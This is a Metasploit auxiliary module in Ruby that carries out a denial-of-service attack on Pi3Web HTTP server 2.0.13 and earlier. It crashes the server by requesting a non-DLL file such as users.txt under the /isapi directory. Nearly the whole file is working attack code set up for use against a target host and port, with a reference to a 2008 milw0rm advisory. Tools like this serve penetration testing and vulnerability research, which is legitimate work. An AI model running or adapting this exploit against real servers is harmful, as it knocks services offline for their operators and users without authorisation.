require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Pi3Web <=2.0.13 ISAPI DoS',
			'Description'    => %q{
				The Pi3Web HTTP server crashes when a request is made
				for an invalid DLL file in /isapi.  By default, the
				non-DLLs in this directory after installation are
				users.txt, install.daf and readme.daf.
			},
			'Author'         => 'kris katterjohn',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 6459 $',
			'References'     => [
				[ 'URL', 'http://milw0rm.com/exploits/7109' ]
			],
			'DisclosureDate' => 'Nov 13 2008'))

		register_options([
			OptString.new('FILENAME', [ true, 'File in /isapi to request', 'users.txt' ])
		])
	end

	def run
		begin
			o = { 'uri' => "/isapi/#{datastore['FILENAME']}" }

			c = connect(o)
			c.send_request(c.request_raw(o))

			print_status("Request sent to #{rhost}:#{rport}")
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_status("Couldn't connect to #{rhost}:#{rport}")
		rescue ::Timeout::Error, ::Errno::EPIPE			
		end
	end
end
